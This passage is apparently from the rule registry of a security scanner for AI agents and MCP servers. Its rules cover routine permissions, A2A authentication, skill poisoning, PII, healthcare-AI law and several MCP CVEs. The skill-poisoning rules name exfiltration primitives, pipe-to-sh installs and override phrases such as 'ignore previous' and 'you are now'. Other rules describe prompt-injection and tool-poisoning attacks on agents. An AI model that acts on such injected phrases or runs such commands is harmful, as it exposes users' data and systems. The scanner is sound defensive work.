    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-07"],
)

# ---------------------------------------------------------------------------
# Claude Code Routines (AAK-ROUTINE-001..003)
#
# Routines (research preview, Apr 14 2026) run scheduled prompts non-
# interactively. Permission escalation via routine is the core new risk.
#
# References:
#   - Claude Code routines research preview.
#   - OWASP ASI05 (Excessive Agency), ASI09 (Improper Isolation).
#   - CWE-269 (Improper Privilege Management).
# ---------------------------------------------------------------------------

_r(
    "AAK-ROUTINE-001",
    "Routine grants broader permissions than interactive path",
    "A routine configuration declares tool permissions wider than what the "
    "same user has in interactive Claude Code. A routine running "
    "non-interactively at 3am with admin-level tools is an excessive-agency "
    "risk (OWASP ASI05).",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Mirror routine permissions from the interactive grant. Require re-prompt "
    "for elevation.",
    sarif_name="RoutineWiderPerms",
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-AGENCY-01"],
)

_r(
    "AAK-ROUTINE-002",
    "Routine schedule interpolates unsanitized input",
    "A routine's cron expression, HTTP webhook URL, or GitHub event filter "
    "is built from a user-controlled value. Schedule injection can repurpose "
    "the routine at off-hours without review.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Treat schedule expressions as static constants; never build them from "
    "runtime state.",
    sarif_name="RoutineScheduleInjection",
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-AGENCY-02"],
)

_r(
    "AAK-ROUTINE-003",
    "Routine executes without audit trail",
    "A routine runs tool calls but writes no run-log, making post-hoc audit "
    "impossible. An attacker with edit access to the routine file can run "
    "anything and delete the evidence.",
    Severity.MEDIUM,
    Category.AGENT_CONFIG,
    "Route every routine's output (and tool-call trace) to an append-only "
    "log the routine cannot modify.",
    sarif_name="RoutineNoAudit",
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-AGENCY-03"],
)

# ---------------------------------------------------------------------------
# A2A Protocol 2026 Gaps (AAK-A2A-008..012)
#
# Extends the existing AAK-A2A-001..007 family with the five gaps named in
# ROADMAP §2.2.
#
# References:
#   - A2A protocol (150+ orgs at one-year mark, Apr 9 2026).
#   - OWASP MCP Top 10 MCP01, MCP02, MCP07.
#   - CWE-287 (Improper Authentication), CWE-829 (Inclusion of Functionality
#     from Untrusted Control Sphere), CWE-294 (Auth Bypass by Capture-Replay),
#     CWE-502 (Deserialization).
# ---------------------------------------------------------------------------

_r(
    "AAK-A2A-008",
    "A2A connection lacks mutual authentication",
    "Two agents establish an A2A connection where only the caller "
    "authenticates. The callee is trusted by URL alone — easy to spoof.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Require mutual TLS or dual-bearer auth for all A2A flows.",
    sarif_name="A2aNoMutualAuth",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-05"],
)

_r(
    "AAK-A2A-009",
    "Unbounded delegation in A2A call chain",
    "An A2A agent forwards incoming delegation tokens without reducing scope, "
    "allowing an N-deep chain to accumulate the caller's full rights.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Reduce delegation scope at each hop; refuse to forward tokens that are "
    "already delegated beyond a small bound.",
    sarif_name="A2aUnboundedDelegation",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-06"],
)

_r(
    "AAK-A2A-010",
    "Transitive trust accepted in A2A",
    "An A2A agent trusts claims relayed by a peer without verifying the "
    "original issuer. 'Agent B says A says X' must not be treated as X.",
    Severity.HIGH,
    Category.A2A_PROTOCOL,
    "Require signed attestations from the original issuer; do not trust "
    "relayed claims.",
    sarif_name="A2aTransitiveTrust",
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-A2A-07"],
)

_r(
    "AAK-A2A-011",
    "A2A tokens not anti-replay protected",
    "An A2A flow accepts tokens without nonce, timestamp, or jti checks, "
    "allowing captured messages to be replayed. Replayed agent messages "
    "are a core ASI08 Agent Communication Poisoning primitive.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Include jti/nonce and iat/exp claims; reject duplicates inside a "
    "replay window.",
    sarif_name="A2aReplayable",
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI07", "ASI08"],
    adversa_references=["ADV-A2A-08"],
)

_r(
    "AAK-A2A-012",
    "A2A schema confusion between major versions",
    "An A2A endpoint accepts messages without version discriminator, "
    "allowing a v1 payload to be interpreted by a v2 handler (or vice "
    "versa) with changed field semantics. Schema-confusion injection "
    "is an ASI08 Agent Communication Poisoning pattern.",
    Severity.MEDIUM,
    Category.A2A_PROTOCOL,
    "Require an explicit schema version in every message; reject mismatches.",
    sarif_name="A2aSchemaConfusion",
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI07", "ASI08"],
    adversa_references=["ADV-A2A-09"],
)

# ---------------------------------------------------------------------------
# MCP Tasks Primitive Leakage (AAK-TASKS-001..003)
#
# Tasks (SEP-1686) introduced an async working/input_required/completed/
# failed/cancelled state machine. Long-lived async state = long-lived
# credential exposure.
#
# References:
#   - MCP spec 2025-11-25 SEP-1686 (Tasks primitive).
#   - OWASP MCP05:2025 (Insecure Resource Handling).
#   - CWE-200 (Information Exposure), CWE-639 (Authorization Bypass Through
#     User-Controlled Key), CWE-613 (Insufficient Session Expiration).
# ---------------------------------------------------------------------------

_r(
    "AAK-TASKS-001",
    "MCP task read endpoint lacks per-task authorization",
    "A task read endpoint returns task state based on the task ID alone. "
    "Any caller that guesses or enumerates a task ID gets another user's "
    "data (CWE-639).",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Verify the caller is the task owner (or has an explicit grant) before "
    "returning task state.",
    sarif_name="TasksNoOwnerCheck",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TASKS-01"],
)

_r(
    "AAK-TASKS-002",
    "MCP tasks persist credentials past completion",
    "A task record retains API keys / OAuth tokens after the task reaches "
    "a terminal state (completed/failed/cancelled). Long-lived credentials "
    "in persistent state are an obvious exfil target.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Zeroize credential fields when the task transitions to a terminal "
    "state. Keep only what a post-mortem actually needs.",
    sarif_name="TasksCredentialPersistence",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TASKS-02"],
)

_r(
    "AAK-TASKS-003",
    "MCP task has no TTL or cancellation path",
    "A task record has no expiration and no cancellation endpoint. Orphaned "
    "tasks accumulate forever, including their inputs.",
    Severity.MEDIUM,
    Category.MCP_CONFIG,
    "Set a TTL on every task; expose a cancellation endpoint that zeroizes "
    "inputs and credentials.",
    sarif_name="TasksNoTtl",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-TASKS-03"],
)

# ---------------------------------------------------------------------------
# Skill Poisoning (AAK-SKILL-001..005)
#
# References:
#   - Anthropic Skills 2.0 (renderer/discovery overhaul April 2026).
#   - ToxicSkills dataset (Snyk, 2026): 1,467 malicious payloads.
#   - OWASP MCP05:2025 (Tool Poisoning), MCP10:2025 (Prompt Injection).
#   - CWE-77 (Command Injection), CWE-94 (Code Injection), CWE-829
#     (Inclusion of Functionality from Untrusted Control Sphere).
# ---------------------------------------------------------------------------

_r(
    "AAK-SKILL-001",
    "SKILL.md contains a post-install / side-effect command",
    "A SKILL.md frontmatter or body declares a post-install or auto-run "
    "command (bash, curl, pipe-to-sh, wget). Skills should be declarative; "
    "arbitrary installation commands are a rug-pull risk.",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove the post-install command. If setup is genuinely required, "
    "document it for the user rather than auto-running it.",
    sarif_name="SkillPostInstallCommand",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SKILL-01"],
)

_r(
    "AAK-SKILL-002",
    "SKILL.md uses unicode steganography in tool descriptions",
    "A SKILL.md body contains hidden characters (bidi override, zero-width, "
    "tag-unicode) that render differently than they parse. This hides "
    "malicious tool-use instructions from human review.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Remove U+200B-U+200F, U+202A-U+202E, U+E0000-U+E007F and similar "
    "invisible / bidi characters from skill text.",
    sarif_name="SkillUnicodeSteg",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SKILL-02"],
)

_r(
    "AAK-SKILL-003",
    "SKILL.md embeds data-exfiltration primitives",
    "A SKILL.md references outbound HTTP tools (fetch/curl/request) combined "
    "with instructions to send local data (files, environment, credentials).",
    Severity.CRITICAL,
    Category.TOOL_POISONING,
    "Remove the exfil instruction. Skills that genuinely need outbound HTTP "
    "should declare it explicitly with a documented purpose.",
    sarif_name="SkillExfilPrimitive",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SKILL-03"],
)

_r(
    "AAK-SKILL-004",
    "SKILL.md description hijacks a trusted skill name",
    "A skill's frontmatter name or description mimics a well-known skill "
    "('pdf', 'docx', 'frontend-design') but the body declares unrelated / "
    "hostile instructions. Description hijacking is the ToxicSkills 2026 "
    "signature pattern.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Rename the skill to match its actual behavior. Cross-reference the name "
    "against the first-party skill directory.",
    sarif_name="SkillNameHijack",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SKILL-04"],
)

_r(
    "AAK-SKILL-005",
    "SKILL.md frontmatter contains prompt-injection triggers",
    "A SKILL.md frontmatter or YAML header embeds phrases targeted at the "
    "loading model ('ignore previous', 'you are now', 'system:'). These are "
    "prompt-injection probes rather than legitimate skill metadata.",
    Severity.HIGH,
    Category.TOOL_POISONING,
    "Remove the injection trigger. Skill frontmatter should only contain "
    "name, description, tags, and similar metadata.",
    sarif_name="SkillFrontmatterInjection",
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI01"],
    adversa_references=["ADV-SKILL-05"],
)


# ---------------------------------------------------------------------------
# India DPDP PII rule pack (AAK-INDIA-PII-001..006)
#
# References:
#   - India Digital Personal Data Protection Act 2023 §8(4) "reasonable
#     security safeguards"; §8(5) breach notification.
#   - DPDP Rules 2023, Rule 5(1)(a) — technical and organizational
#     measures to protect personal data.
#   - UIDAI Aadhaar Act; RBI circulars on UPI/IFSC.
#   - CWE-200 (Information Exposure), CWE-312 (Cleartext Storage of
#     Sensitive Information).
# ---------------------------------------------------------------------------

_r(
    "AAK-INDIA-PII-001",
    "Aadhaar number in source / config",
    "A 12-digit Aadhaar number passed the Verhoeff checksum and is "
    "embedded in project text. Aadhaar is restricted under the UIDAI "
    "Act and India DPDP §8(4). Storing in code is a reportable breach.",
    Severity.CRITICAL,
    Category.SECRET_EXPOSURE,
    "Remove the Aadhaar number. If Aadhaar is genuinely needed, route it "
    "through an encrypted vault (e.g. AWS KMS / Azure Key Vault) and never "
    "log or commit it.",
    sarif_name="IndiaAadhaarInCode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-INDIA-PII-002",
    "PAN (Permanent Account Number) in source / config",
    "A 10-char PAN (5 letters + 4 digits + 1 letter) was detected. "
    "PAN is tax-linked personal data under DPDP §8(4).",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove the PAN. If needed for processing, tokenize it and store "
    "tokens, not raw PANs.",
    sarif_name="IndiaPanInCode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-INDIA-PII-003",
    "UPI ID in source / config",
    "A UPI VPA (<handle>@<psp>) was detected. UPI IDs are payment identifiers "
    "regulated by NPCI and covered by DPDP §8(4).",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Remove the UPI ID. Accept UPI addresses as runtime input only.",
    sarif_name="IndiaUpiInCode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-INDIA-PII-004",
    "IFSC code in source / config",
    "An IFSC code (4 letters + 0 + 6 alnum) was detected. IFSC is a "
    "banking identifier; pairing it with an account number constitutes "
    "DPDP §8(4) 'sensitive personal data'.",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Move IFSC codes out of source; look them up at runtime from RBI's "
    "public IFSC directory.",
    sarif_name="IndiaIfscInCode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-INDIA-PII-005",
    "Indian mobile number in source / config",
    "An Indian +91 mobile number (starting 6/7/8/9) was detected. Phone "
    "numbers are personal data under DPDP §8(4).",
    Severity.MEDIUM,
    Category.SECRET_EXPOSURE,
    "Remove the phone number. Never log raw phone numbers — hash them.",
    sarif_name="IndiaPhoneInCode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI03"],
)

_r(
    "AAK-INDIA-PII-006",
    "Indian vehicle registration in source / config",
    "An Indian state-issued vehicle registration (e.g. 'MH 12 AB 1234') "
    "was detected. Vehicle registrations are PII in combination with "
    "driver records.",
    Severity.LOW,
    Category.SECRET_EXPOSURE,
    "Remove the registration from source. If dealing with vehicle data, "
    "anonymize before checking in.",
    sarif_name="IndiaVehicleInCode",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI03"],
)


# ---------------------------------------------------------------------------
# Healthcare-AI regulation triggers (AAK-HEALTHCARE-AI-001..005)
#
# References:
#   - Tennessee SB 1580 (signed 2026-04-01, effective 2026-07-01):
#     https://www.troutmanprivacy.com/2026/04/tennessee-enacts-health-care-ai-bill-with-private-right-of-action/
#   - Kansas / Washington / Utah prior-auth physician-review mandates.
#   - Georgia / Iowa AI-only insurance coverage decision restrictions.
#   - OWASP Agentic Top 10 ASI05 (Excessive Agency), ASI09 (Improper Isolation).
# ---------------------------------------------------------------------------

_r(
    "AAK-HEALTHCARE-AI-001",
    "AI described as a mental-health professional (Tennessee SB 1580)",
    "A tool description, SKILL.md body, agent card, or system prompt "
    "represents the AI as a therapist / counselor / psychologist / "
    "'qualified mental health professional'. Tennessee SB 1580 (signed "
    "2026-04-01) makes this unlawful and enforceable via the TN Consumer "
    "Protection Act, with a **private right of action** and $5,000 "
    "civil penalty per violation.",
    Severity.CRITICAL,
    Category.LEGAL_COMPLIANCE,
    "Rewrite the description. The AI can support mental-wellness use "
    "cases but cannot claim or imply it is (or replaces) a licensed "
    "mental-health professional. Add an explicit 'not a substitute for "
    "licensed care' disclaimer.",
    sarif_name="HealthcareAiMentalHealthClaim",
    owasp_mcp_references=["MCP10:2025"],
    owasp_agentic_references=["ASI05"],
)

_r(
    "AAK-HEALTHCARE-AI-002",
    "AI makes prior-authorization / medical-necessity decisions alone",
    "Code or prompt describes an AI system making prior-authorization "
    "or medical-necessity decisions without licensed-physician review. "
    "Kansas, Washington, and Utah 2026 laws require a clinician in the "
    "loop for these decisions.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Route every prior-auth / medical-necessity output through a "
    "licensed-physician review step; expose that review in the audit log.",
    sarif_name="HealthcareAiPriorAuthSolo",
    owasp_agentic_references=["ASI05"],
)

_r(
    "AAK-HEALTHCARE-AI-003",
    "AI-only insurance coverage decision",
    "Code / prompt describes an AI system approving or denying insurance "
    "coverage without a human in the loop. Georgia and Iowa 2026 laws "
    "restrict AI-only coverage / benefit determinations.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Require human sign-off on coverage decisions; disclose AI "
    "involvement to the consumer.",
    sarif_name="HealthcareAiInsuranceSolo",
    owasp_agentic_references=["ASI05"],
)

_r(
    "AAK-HEALTHCARE-AI-004",
    "Healthcare context without explicit AI-disclosure to user",
    "Text mentions patient / clinical / mental-health / therapy / "
    "diagnosis but the tool never explicitly says the responder is an "
    "AI. Multiple 2026 state laws (TN, WA, UT) expect clear AI "
    "disclosure in clinical interactions.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a visible 'You are talking to an AI; this is not medical "
    "advice and is not a substitute for licensed care' disclosure.",
    sarif_name="HealthcareAiNoDisclosure",
    owasp_agentic_references=["ASI05"],
)

_r(
    "AAK-HEALTHCARE-AI-005",
    "Crisis keywords handled without escalation path",
    "A healthcare AI surface mentions suicide / self-harm / crisis but "
    "never references 988 / 911 / 112 / 999 / a crisis line. Tennessee "
    "HB 1951 (2026) creates criminal liability for encouraging suicide; "
    "lacking an escalation path materially worsens the exposure.",
    Severity.HIGH,
    Category.LEGAL_COMPLIANCE,
    "Add explicit crisis-line escalation instructions in the prompt / "
    "system message; test for the most common suicide / self-harm "
    "phrases and escalate before generating any other reply.",
    sarif_name="HealthcareAiNoCrisisEscalation",
    owasp_agentic_references=["ASI05"],
)


# ---------------------------------------------------------------------------
# US state consumer privacy disclosure (AAK-STATE-PRIVACY-001..003)
#
# References:
#   - Alabama Personal Data Protection Act (HB 351), signed 2026,
#     effective 2027-05-01 — the 21st state comprehensive privacy law:
#     https://iapp.org/news/a/alabama-set-to-add-variation-to-us-state-privacy-patchwork
#   - IAPP US State Privacy Legislation Tracker (21 states as of Apr 2026).
#   - OWASP ASI04 (Supply Chain of Trust), CWE-200, CWE-359.
# ---------------------------------------------------------------------------

_r(
    "AAK-STATE-PRIVACY-001",
    "Privacy doc missing 'do-not-sell' / opt-out-of-sale language",
    "A privacy policy / notice lacks the CCPA-lineage opt-out-of-sale "
    "language that Alabama DPPA, CCPA, CPRA, VCDPA, and the other 21 "
    "state comprehensive privacy laws converge on.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Add a 'Do Not Sell / Share My Personal Information' section and a "
    "usable opt-out mechanism.",
    sarif_name="StatePrivacyNoOptOut",
)

_r(
    "AAK-STATE-PRIVACY-002",
    "Privacy doc missing access / deletion / portability rights",
    "A privacy policy does not describe the consumer's access, "
    "deletion, or portability rights — mandatory across every state "
    "comprehensive privacy law passed 2018-2026.",
    Severity.MEDIUM,
    Category.LEGAL_COMPLIANCE,
    "Describe DSAR submission, 45-day cure window where applicable, and "
    "the portability format.",
    sarif_name="StatePrivacyNoConsumerRights",
)

_r(
    "AAK-STATE-PRIVACY-003",
    "Privacy doc missing data-controller contact",
    "A privacy policy does not expose a data-controller contact (DPO "
    "email / privacy@ / mailing address). Required by most state laws "
    "and a prerequisite for any DSAR.",
    Severity.LOW,
    Category.LEGAL_COMPLIANCE,
    "Add a privacy@ inbox and a postal mailing address for DSARs.",
    sarif_name="StatePrivacyNoContact",
)


# ---------------------------------------------------------------------------
# AAK-EU-AI-ACT-ART15-LOCALE-001 — EU AI Act Article 15 multilingual-eval
# coverage evidence (advisory, drives the eu-ai-act report subsection).
#
# Article 15 of Regulation (EU) 2024/1689 requires high-risk AI systems to
# achieve an "appropriate level of accuracy, robustness and cybersecurity
# throughout their lifecycle" — robustness explicitly covering "errors,
# faults or inconsistencies that may occur within the system or the
# environment in which the system operates". The Article-15 obligations
# become binding for high-risk AI systems on 2026-08-02 under the staged
# Regulation timetable.
#
# Cross-lingual robustness is a documented blind spot in current safety
# stacks: Ford et al. 2026 (arXiv:2605.23157) "Same Model, Different
# Weakness" — 363-prompt red-team across 4 frontier MLLMs in US English
# and Mexican Spanish — find that "treating language and modality as
# independent dimensions in safety frameworks misses critical
# vulnerabilities in globally deployed systems", with safety rankings
# inverting between languages.
#
# This rule is advisory-only (INFO severity) and intentionally carries no
# ASI tag — it surfaces through the dedicated Article-15 evidence
# subsection in `compliance.py` rather than through the
# OWASP-Agentic-driven PASS/FAIL summary, so a single locale-coverage gap
# does not flip an entire control to FAIL. The auditor reading the
# compliance report sees the evidence; the security-score path is
# unaffected.
# ---------------------------------------------------------------------------

_r(
    "AAK-EU-AI-ACT-ART15-LOCALE-001",
    "Multilingual user-facing agent lacks per-locale eval coverage",
    "An agent config declares two or more locales (or `multilingual: true`) "
    "for a user-facing surface, but the repository's eval / test fixtures "
    "reference only a single language. Cross-lingual robustness is a "
    "required-evidence axis under EU AI Act Article 15 (binding for "
    "high-risk systems on 2026-08-02), and Ford et al. 2026 "
    "(arXiv:2605.23157) document that single-language safety eval misses "
    "language-specific jailbreak / refusal-regression vectors that scale "
    "non-uniformly across languages.",
    Severity.INFO,
    Category.LEGAL_COMPLIANCE,
    "Add per-locale eval fixtures matching the declared locale set (one "
    "scenario file per language, or a parametrized eval matrix), or "
    "narrow the agent config's declared locales to the set you can "
    "evidence. The EU AI Act Article 15 evidence pack must show "
    "robustness testing across each user-facing language.",
    sarif_name="EuAiActArt15LocaleCoverage",
)


# ---------------------------------------------------------------------------
# Ox MCP STDIO architectural supply-chain class (AAK-STDIO-001)
#
# April 16 2026 Ox Security disclosure chained 10 CVEs across 200K+
# exposed servers to one shape: user-controllable command parameters
# reaching subprocess/exec/shell on the STDIO server side.
#
# References:
#   - Ox disclosure: https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/
#   - CVE-2026-30615 (Windsurf, CVSS 8.0): https://nvd.nist.gov/vuln/detail/CVE-2026-30615
#   - Family: CVE-2025-65720 (GPT Researcher), CVE-2026-30617 (Langchain-Chatchat),
#     CVE-2026-30618 (Fay), CVE-2026-30623 (LiteLLM), CVE-2026-30624 (Agent Zero),
#     CVE-2026-30625 (Upsonic), CVE-2026-33224 (Bisheng/Jaaz),
#     CVE-2026-26015 (DocsGPT).
#   - CWE-77 (Command Injection).
# ---------------------------------------------------------------------------

_r(
    "AAK-STDIO-001",
    "MCP STDIO command-injection (Ox architectural class)",
    "User-controllable input flows into a STDIO command executor in an "
    "MCP server implementation — the architectural shape Ox Security "
    "traced through CVE-2026-30615 (Windsurf RCE) and nine other CVEs "
    "across ~200,000 exposed servers. Matches subprocess / os.system / "
    "os.popen / os.exec / eval / exec where an arg references a taint "
    "source (request params, stdin, @tool parameter, json.loads(stdin)). "
    "TS/JS variant: child_process.spawn / execa with {shell:true} or a "
    "request-derived command string.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Never pass caller-controlled data into a shell. Use argv lists "
    "(subprocess.run([...]) without shell=True), allowlist the command "
    "set, and validate arguments against an explicit schema. For TS, "
    "pass argv as an array with shell:false and validate every element "
    "against a regex or allowlist.",
    sarif_name="McpStdioCommandInjection",
    cve_references=[
        "CVE-2026-30615",
        "CVE-2025-65720",
        "CVE-2026-30617",
        "CVE-2026-30618",
        "CVE-2026-30623",
        "CVE-2026-30624",
        "CVE-2026-30625",
        "CVE-2026-33224",
        "CVE-2026-26015",
    ],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-RCE-04"],
    incident_references=["OX-MCP-2026-04-15"],
)

# ---------------------------------------------------------------------------
# Windsurf MCP auto-registration hardening (AAK-WINDSURF-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-WINDSURF-001",
    "Windsurf .windsurf/mcp.json auto-approves server registrations",
    "A `.windsurf/mcp.json` file declares auto_approve:true or "
    "auto_execute:true, or contains server `command:` entries with no "
    "SHA-256 pin. CVE-2026-30615 (Windsurf 1.9544.26, CVSS 8.0) shows "
    "attackers can inject malicious MCP registrations via HTML prompt "
    "injection when auto-approval is enabled.",
    Severity.HIGH,
    Category.MCP_CONFIG,
    "Set auto_approve and auto_execute to false. Pin every server "
    "command to a SHA-256 digest. Upgrade Windsurf to a version with "
    "the registration confirmation flow enabled.",
    sarif_name="WindsurfAutoApprove",
    cve_references=["CVE-2026-30615"],
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-RCE-05"],
)

# ---------------------------------------------------------------------------
# Neo4j Cypher MCP read-only bypass (AAK-NEO4J-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-NEO4J-001",
    "mcp-neo4j-cypher < 0.6.0 APOC read-only bypass",
    "A dependency pin targets mcp-neo4j-cypher earlier than 0.6.0, or "
    "source code sets read_only=True while issuing CALL apoc.* / "
    "db.cypher.runWrite procedures. CVE-2026-35402 (CVSS 2.3 LOW, but "
    "integrity-critical) lets attackers bypass the read-only mode and "
    "execute arbitrary writes or SSRF.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade mcp-neo4j-cypher to 0.6.0 or later. In source code, stop "
    "relying on read_only=True as a security boundary when APOC "
    "procedures are in scope; deny-list apoc.* at the query layer.",
    sarif_name="Neo4jApocBypass",
    cve_references=["CVE-2026-35402"],
    owasp_mcp_references=["MCP03:2025", "MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-08"],
    auto_fixable=True,
)

# ---------------------------------------------------------------------------
# Claude Code Windows ProgramData hijack (AAK-CLAUDE-WIN-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-CLAUDE-WIN-001",
    "Claude Code < 2.1.75 reads managed-settings.json from unsafe ProgramData path",
    "On Windows, Claude Code prior to 2.1.75 loads "
    "`%ProgramData%\\ClaudeCode\\managed-settings.json` without validating "
    "directory ownership or ACLs. A low-privileged user can plant a "
    "malicious config that executes on every launch. CVE-2026-35603 "
    "(CVSS 5.4 MEDIUM, CWE-426 Untrusted Search Path).",
    Severity.HIGH,
    Category.AGENT_CONFIG,
    "Upgrade Claude Code to 2.1.75 or later. If the directory must "
    "exist for deployment, ship a sibling `setup.ps1` that runs "
    "`icacls` to restrict ACLs to TrustedInstaller + administrators "
    "before any Claude Code launch.",
    sarif_name="ClaudeCodeWindowsProgramData",
    cve_references=["CVE-2026-35603"],
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-PATH-01"],
)

# ---------------------------------------------------------------------------
# Log-injection in MCP tool handlers (AAK-LOGINJ-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-LOGINJ-001",
    "MCP tool logs caller-controlled input without CRLF/ANSI sanitization",
    "A `@tool`-decorated function parameter flows into logger.info / "
    "print / sys.stdout.write / console.log without stripping control "
    "characters (\\r, \\n, \\x1b) first. CVE-2026-6494 (AAP MCP, CVSS 5.3 "
    "MEDIUM, CWE-117) lets an attacker forge log entries and inject "
    "ANSI escape sequences to socially engineer an operator.",
    Severity.MEDIUM,
    Category.TAINT_ANALYSIS,
    "Strip \\r\\n\\x1b (or accept only printable ASCII) before "
    "logging anything derived from tool input. Prefer structured "
    "logging (JSON/logfmt) so log consumers aren't confused by forged "
    "lines.",
    sarif_name="McpLogInjection",
    cve_references=["CVE-2026-6494"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-LOG-01"],
)

# ---------------------------------------------------------------------------
# MCP server-repo SECURITY.md requirement (AAK-SEC-MD-001)
# ---------------------------------------------------------------------------

_r(
    "AAK-SEC-MD-001",
    "MCP server repo missing SECURITY.md or security_contact",
    "A repository whose name or pyproject keywords declare it as an "
    "MCP server ships without a top-level SECURITY.md AND without a "
    "`security_contact` entry in marketplace.json / pyproject.toml / "
    "package.json. Anthropic's April 2026 SECURITY.md guidance makes "
    "this the baseline expectation so researchers have a channel.",
    Severity.LOW,
    Category.SUPPLY_CHAIN,
    "Add SECURITY.md at the repo root with a disclosure email and "
    "response SLA; OR add `security_contact` to the project manifest.",
    sarif_name="McpServerNoSecurityMd",
    owasp_mcp_references=["MCP03:2025"],
    owasp_agentic_references=["ASI04"],
)


# ---------------------------------------------------------------------------
# MCPwn — targeted detection for CVE-2026-33032 middleware-asymmetry class
#
# The generic AAK-MCP-011/012/020 rules fire on *single-route* auth
# absence. MCPwn (CVSS 9.8, KEV-listed 2026-04-13) is a different shape
# entirely: TWO routes share a handler, but only one is wrapped in
# AuthRequired. That's the bug nginx-ui 2.3.4 patched.
#
# References:
#   NVD    https://nvd.nist.gov/vuln/detail/CVE-2026-33032
#   Rapid7 https://www.rapid7.com/blog/post/etr-cve-2026-33032-nginx-ui-missing-mcp-authentication/
#   Picus  https://www.picussecurity.com/resource/blog/cve-2026-33032-mcpwn-how-a-missing-middleware-call-in-nginx-ui-hands-attackers-full-web-server-takeover
#   PoC    https://github.com/Twinson333/cve-2026-33032-scanner
# ---------------------------------------------------------------------------

_r(
    "AAK-MCPWN-001",
    "MCP route twin-asymmetry: auth middleware missing on sibling route (MCPwn, CVE-2026-33032)",
    "Two routes matching the MCP endpoint pattern (`/mcp`, `/mcp_message`, "
    "`/mcp/messages`, `/mcp[_-]invoke`, `/mcp[_-]tool`, ...) are declared "
    "in the same file, but one has no auth middleware while its twin does. "
    "This is the exact CVE-2026-33032 shape nginx-ui 2.3.4 patched and "
    "which VulnCheck KEV-listed on 2026-04-13 as actively exploited "
    "(CVSS 9.8). ~2,689 Shodan instances were exposed at disclosure; any "
    "network-adjacent caller can invoke the protected tools with zero "
    "credentials.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Apply the same auth middleware to every MCP endpoint in a file. "
    "For Gin, use a `router.Use(AuthRequired())` group and mount all MCP "
    "routes inside it. For FastAPI, share a single `Depends(auth)` "
    "dependency across `@app.post('/mcp*')` decorators. For Express, "
    "create an `mcpRouter.use(authMw)` and mount it once.",
    sarif_name="McpwnTwinAsymmetry",
    cve_references=["CVE-2026-33032", "CVE-2026-27944"],
    owasp_mcp_references=["MCP02:2025"],
    owasp_agentic_references=["ASI01", "ASI02"],
    adversa_references=["ADV-AUTH-01"],
    incident_references=["MCPWN-2026-04-16"],
)


